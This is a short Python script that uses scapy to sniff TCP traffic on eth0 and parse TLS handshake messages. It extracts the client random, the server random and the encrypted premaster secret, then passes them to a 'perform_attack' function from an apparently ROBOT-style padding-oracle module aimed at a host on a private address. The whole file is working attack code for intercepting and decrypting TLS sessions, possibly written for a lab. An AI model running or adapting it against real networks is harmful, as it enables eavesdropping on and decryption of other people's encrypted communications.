from scapy.all import *
import struct
import binascii 
from robot import perform_attack
load_layer("tls")

client_random = None
server_random = None
enc_premaster_secret = None

def to_hex(bytes):
  return binascii.hexlify(bytearray(bytes))

def process_packet(packet):
  global client_random
  global server_random
  global enc_premaster_secret
  if (Raw in packet):
    raw = bytes(packet[Raw])
    if(int(raw[0]) == 22): # handshake
      if (int(raw[5]) == 1):
        print("Found ClientHello")
        client_random = raw[11:43]
        print("client random: " + str(to_hex(client_random)))
      elif (int(raw[5]) == 2):
        print("Found ServerHello")
        server_random = raw[11:43]
        print("server random: " + str(to_hex(server_random)))
      elif (int(raw[5]) == 16):
        print("Found Client key exchange")
        length = int.from_bytes(raw[9:11], "big")
        print("secret length: " + str(length))
        enc_premaster_secret = raw[11:11+length]
        print("enc_premaster_secret: " + str(to_hex(enc_premaster_secret)))
        perform_attack(8888, '10.0.1.30', False, client_random, server_random, enc_premaster_secret)

sniff(filter="tcp", prn=process_packet, iface="eth0", store=True)

